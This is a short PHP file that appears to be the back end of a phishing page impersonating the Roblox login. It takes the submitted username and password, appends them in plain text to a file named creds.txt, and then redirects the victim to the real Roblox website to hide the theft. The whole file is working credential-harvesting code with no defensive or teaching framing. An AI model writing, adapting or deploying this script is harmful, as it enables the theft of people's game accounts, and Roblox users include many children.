<?php
$username = $_POST['username'];
$password = $_POST['password'];

// Save credentials to a file
$file = fopen("creds.txt", "a");
fwrite($file, "Username: " . $username . " Password: " . $password . "\n");
fclose($file);

// Redirect the user to the actual Roblox website
header("Location: https://www.roblox.com");
exit();
?>
